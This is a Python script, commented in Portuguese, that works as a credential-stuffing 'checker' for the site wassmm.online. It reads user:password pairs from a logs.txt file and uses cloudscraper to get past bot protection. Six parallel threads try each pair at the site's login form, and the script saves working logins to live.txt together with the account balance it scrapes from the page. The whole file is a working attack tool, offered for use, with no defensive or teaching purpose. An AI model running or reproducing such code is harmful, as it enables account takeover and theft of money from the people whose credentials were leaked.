import cloudscraper
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import time

init(autoreset=True)

# Configurações
MAX_THREADS = 6
TIMEOUT = 15
LOGINS_FILE = 'logs.txt'
LIVE_FILE = 'live.txt'
DIE_FILE = 'die.txt'

# Contadores
stats = {
    'total': 0,
    'live': 0,
    'die': 0,
    'error': 0,
    'start_time': time.time()
}

def update_panel():
    elapsed = time.time() - stats['start_time']
    print("\033[H\033[J")  # Limpa o terminal
    print(Fore.CYAN + "══════════════════════════════════")
    print(Fore.YELLOW + "      WASMM ONLINE CHECKER")
    print(Fore.CYAN + "══════════════════════════════════")
    print(Fore.GREEN + f" ✅ LIVE: {stats['live']}")
    print(Fore.RED + f" ❌ DIE: {stats['die']}")
    print(Fore.YELLOW + f" ⚠ ERROR: {stats['error']}")
    print(Fore.CYAN + f" ⏳ TEMPO: {elapsed:.2f}s")
    print(Fore.CYAN + "══════════════════════════════════")

def check_account(user, password):
    try:
        scraper = cloudscraper.create_scraper()
        
        # Primeira tentativa de login
        url = "https://wassmm.online/"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        payload = {
            "username": user,
            "password": password,
            "_csrf": "244d94d380df1796216530d971a60892_812085f0637e201bd207bb2450dc3fd6",
            "login_btn": "Login"
        }
        
        response = scraper.post(url, headers=headers, data=payload, timeout=TIMEOUT)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Verifica se login foi bem sucedido
        categoria_div = soup.find('div', class_='form-hidden form-group')
        
        if categoria_div:
            saldo_div = soup.find('h3', class_='card-title', string='Saldo Disponivel')
            saldo = saldo_div.find_next_sibling('h3', class_='card-text text-right').text.strip() if saldo_div else "N/A"
            
            stats['live'] += 1
            save_result(LIVE_FILE, user, password, saldo)
            return Fore.GREEN + f"✓ Live {user}:{password} | Saldo: {saldo}"
        else:
            stats['die'] += 1
            save_result(DIE_FILE, user, password)
            return Fore.RED + f"× Die {user}:{password}"

    except Exception as e:
        stats['error'] += 1
        save_result(DIE_FILE, user, password, str(e))
        return Fore.RED + f"× Error {user}:{password} - {str(e)[:30]}"

def save_result(filename, user, password, extra_info=None):
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            if extra_info:
                if isinstance(extra_info, str) and "Error" in extra_info:
                    f.write(f'{user}:{password} | {extra_info}\n')
                else:
                    f.write(f'{user}:{password} | Saldo: {extra_info}\n')
            else:
                f.write(f'{user}:{password}\n')
    except Exception as e:
        print(Fore.RED + f"Erro ao salvar resultado: {str(e)}")

def main():
    if not os.path.exists(LOGINS_FILE):
        print(Fore.RED + f"Arquivo {LOGINS_FILE} não encontrado!")
        return

    with open(LOGINS_FILE, 'r', encoding='utf-8') as f:
        accounts = [line.strip().split(':', 1) for line in f if ':' in line]
    
    stats['total'] = len(accounts)
    update_panel()

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        for acc in accounts:
            if len(acc) == 2:
                user, password = acc[0], acc[1]
                futures.append(executor.submit(check_account, user, password))

        for future in as_completed(futures):
            print(future.result())
            update_panel()

    print(Fore.CYAN + "\n✅ Verificação concluída!")
    print(Fore.YELLOW + f"Total de contas: {stats['total']}")
    print(Fore.GREEN + f"Contas Live: {stats['live']}")
    print(Fore.RED + f"Contas Die: {stats['die']}")
    print(Fore.YELLOW + f"Erros: {stats['error']}")

if __name__ == "__main__":
    main()